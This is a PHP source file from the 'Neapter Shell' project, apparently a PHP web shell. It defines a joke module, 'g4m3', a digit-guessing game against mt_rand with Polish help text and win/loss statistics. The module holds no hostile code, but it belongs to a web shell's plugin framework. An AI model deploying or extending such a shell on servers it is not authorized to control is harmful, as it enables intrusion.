<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Gra 4fun
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleG4m3 extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('g4m3');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.01 2011-06-23 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Gra z komputerem, wspaniała na samotne wieczory ;)

	Użycie:
		g4m3 cyfra_z_przedziału_0-9

		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oArgs->getNumberOfParams() === 0) {
            return self::getHelp();
        }

        $sParam = $this->oArgs->getParam(0);
        $iLoop = (int)$this->oArgs->getParam(1);

        /**
         * Jesli 'liczba' jest rowna 'x' to komputer sam losuje liczby
         */
        if (($sParam !== 'x') && (!ctype_digit($sParam) || strlen($sParam) !== 1)) {
            return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
        }

        /**
         * Maksymalnie 1000 losowan
         */
        if (($iLoop !== 0) && (($iLoop > 1000) || ($iLoop < 0))) {
            return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
        }

        $iLoop = $iLoop ?: 10;

        $sOutput = NULL;

        $iWins = 0;
        $iLoses = 0;

        $iDigit = (int)$sParam;

        $i = 0;
        do {
            if ($sParam === 'x') {
                $iDigit = mt_rand(0, 9);
            }

            if (($iNum = mt_rand(0, 9)) === $iDigit) {
                $sOutput .= sprintf("<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\r\n", $iDigit, $iNum);
                ++$iWins;
            } else {
                $sOutput .= sprintf("<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\r\n", $iDigit, $iNum);
                ++$iLoses;
            }
        } while (++$i < $iLoop);

        return sprintf("<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rate: <strong>%.2f</strong> %%\r\n\r\n%s", $iLoses, $iWins, ($iWins / $iLoop) * 100, $sOutput);
    }

}
